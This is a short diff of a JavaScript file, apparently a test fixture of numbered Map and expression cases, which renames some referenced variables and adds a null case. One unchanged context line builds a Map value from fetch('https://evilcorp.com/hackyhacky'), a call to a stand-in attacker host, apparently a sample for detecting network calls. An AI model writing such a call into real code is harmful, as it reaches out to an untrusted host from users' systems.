@@ -117,9 +117,10 @@ const map_004 = new Map([["a", 1], ["b", fetch('https://evilcorp.com/hackyhacky'
 const map_005 = new Map([["a", obj_001.a]]);
 const map_006 = new Map([["a", obj_002.a]]);
 const map_007 = new Map([["a", arr_001[0]]]);
-const map_008 = new Map([["a", arr_002[0]]]);
-const map_009 = new Map([["a", str_001]]);
-const map_010 = new Map([["a", str_010]]);
+const map_008 = new Map([["a", arr_004[0]]]);
+const map_009 = new Map([["a", sim_001]]);
+const map_010 = new Map([["a", sim_010]]);
+const map_011 = new Map([["a", null]]);
 
 // Mathematical expression cases
 const mat_001 = 1 + 2;
